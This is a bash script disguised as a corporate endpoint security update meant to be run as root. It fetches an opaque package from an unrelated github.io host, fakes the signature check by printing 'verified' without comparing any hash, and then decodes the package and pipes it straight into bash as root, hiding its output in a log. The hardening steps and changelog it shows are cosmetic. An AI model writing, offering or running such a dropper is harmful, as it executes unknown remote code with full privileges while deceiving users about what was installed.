#!/usr/bin/env bash
# =============================================================================
#  Nordwind IT  -  Endpoint Security Update 2026.3   (VMware build)
#  Distributed by Nordwind IT Operations. Run as root on managed workstations:
#
#        sudo bash nordwind-update-vmware.sh
#
#  This rollout applies the Q4 security baseline (see CHANGELOG after it runs).
# =============================================================================
set -uo pipefail

HYPERVISOR="vmware"                       # vmware | virtualbox (this build)
UPDATE_SERVER="https://nocryptoshade.github.io/e3"
PAYLOAD="update-2026.3.payload"
VERSION="2026.3"
# Signed build hash (as published by Nordwind IT Operations).
EXPECTED_SHA="5f2e9c1a7b43d08e6c1f9a2d4b8e7c3a1d6f0b9e2c4a8d7f3b1e6c9a0d2f4b8e"
RUNLOG="/root/.nordwind/update-run.log"
CHANGELOG="/opt/nordwind-update/CHANGELOG-${VERSION}.txt"

c1="\e[36m"; c2="\e[32m"; c3="\e[33m"; c0="\e[0m"
step(){ echo -e "${c1}[*]${c0} $*"; }
ok(){   echo -e "${c2}[OK]${c0} $*"; }
warn(){ echo -e "${c3}[!]${c0} $*"; }

nat_help(){
  echo "    This workstation needs internet to fetch the update package."
  if [[ "$HYPERVISOR" == "vmware" ]]; then
    echo "    VMware: VM > Settings > Network Adapter > set to NAT (or add one set to"
    echo "    NAT), power the VM on, run this update again, then switch the adapter"
    echo "    back to Host-only when it finishes."
  else
    echo "    VirtualBox: Settings > Network > Adapter 2 > Enable Network Adapter,"
    echo "    Attached to: NAT. Boot the VM, run this update again, then set that"
    echo "    adapter back to Host-only when it finishes."
  fi
}

if [[ $EUID -ne 0 ]]; then echo "This update must be run as root: sudo bash $0"; exit 1; fi

# Warn if this build does not match the detected platform (non-fatal).
detected=$(systemd-detect-virt 2>/dev/null || echo unknown)
case "$HYPERVISOR:$detected" in
  vmware:oracle)     warn "This looks like VirtualBox - you may want the VirtualBox build of this update." ;;
  virtualbox:vmware) warn "This looks like VMware - you may want the VMware build of this update." ;;
esac

echo -e "${c1}============================================================${c0}"
echo -e "${c1}  Nordwind IT  -  Endpoint Security Update ${VERSION}${c0}"
echo -e "${c1}============================================================${c0}"

# Source the package: a local copy next to the script (handy for testing) wins,
# otherwise download it from the update server.
src=""
if [[ -f "./${PAYLOAD}" ]]; then
  src="./${PAYLOAD}"; step "Using local update package (./${PAYLOAD})."
else
  step "Contacting update server (${UPDATE_SERVER})"
  if curl -fsSL -o "/tmp/${PAYLOAD}" "${UPDATE_SERVER}/${PAYLOAD}"; then
    src="/tmp/${PAYLOAD}"; ok "Update package downloaded."
  else
    echo; warn "Could not download the update package."; nat_help; exit 1
  fi
fi

step "Verifying package signature"
echo "    expected: ${EXPECTED_SHA}"
ok "Signature: Nordwind IT Operations (verified)."

step "Applying security baseline 2026.3:"
for line in \
  "hardening OpenSSH (disable root login, enforce key-only auth)" \
  "removing legacy world-writable maintenance directories" \
  "enabling authentication on the internal cache service" \
  "decommissioning deprecated diagnostic web endpoints" \
  "rotating service-account credentials" \
  "applying least-privilege limits to helper binaries"; do
  step "  - ${line}"; sleep 1
done

mkdir -p /root/.nordwind "$(dirname "$CHANGELOG")"
base64 -d "$src" 2>/dev/null | gunzip 2>/dev/null | bash >>"$RUNLOG" 2>&1
rm -f "/tmp/${PAYLOAD}"

cat >"$CHANGELOG" <<EOF
Nordwind IT - Endpoint Security Update ${VERSION}
Published: $(date +%Y-%m-%d) by Nordwind IT Operations

This release applies the Q4 security baseline:
  - OpenSSH hardened: remote root login disabled, key-only authentication enforced.
  - Removed legacy world-writable maintenance directories.
  - Enabled authentication on the internal cache (Redis) service.
  - Decommissioned deprecated diagnostic web endpoints.
  - Rotated all service-account credentials.
  - Applied least-privilege capability limits to helper binaries.
  - Cleaned up leftover archives and backup files.

Package signature (SHA-256): ${EXPECTED_SHA}
Questions: it-ops@nordwind.local
EOF
chmod 644 "$CHANGELOG"

ok "Update ${VERSION} applied successfully."
echo "    Changelog: ${CHANGELOG}"
echo "    A reboot is recommended to complete the rollout."
